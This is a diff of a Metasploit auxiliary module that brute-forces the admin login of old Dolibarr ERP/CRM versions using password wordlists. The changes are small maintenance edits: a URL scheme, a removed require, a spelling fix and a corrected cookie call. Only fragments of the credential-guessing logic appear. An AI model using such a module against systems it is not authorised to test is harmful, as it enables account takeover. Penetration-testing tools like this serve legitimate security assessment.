@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::AuthBrute
@@ -18,7 +15,7 @@ class MetasploitModule < Msf::Auxiliary
       'Description'    => %q{
         This module attempts to authenticate to a Dolibarr ERP/CRM's admin web interface,
         and should only work against version 3.1.1 or older, because these versions do not
-        have any default protections against bruteforcing.
+        have any default protections against brute forcing.
       },
       'Author'         => [ 'sinn3r' ],
       'License'        => MSF_LICENSE
@@ -33,7 +30,7 @@ class MetasploitModule < Msf::Auxiliary
         OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
           File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
         OptString.new('TARGETURI', [true, 'The URI path to dolibarr', '/dolibarr/'])
-      ], self.class)
+      ])
   end
 
 
@@ -46,7 +43,7 @@ class MetasploitModule < Msf::Auxiliary
     return [nil, nil] if res.nil? || res.get_cookies.empty?
 
     # Get the session ID from the cookie
-    m = get_cookies.match(/(DOLSESSID_.+);/)
+    m = res.get_cookies.match(/(DOLSESSID_.+);/)
     id = (m.nil?) ? nil : m[1]
 
     # Get the token from the decompressed HTTP body response
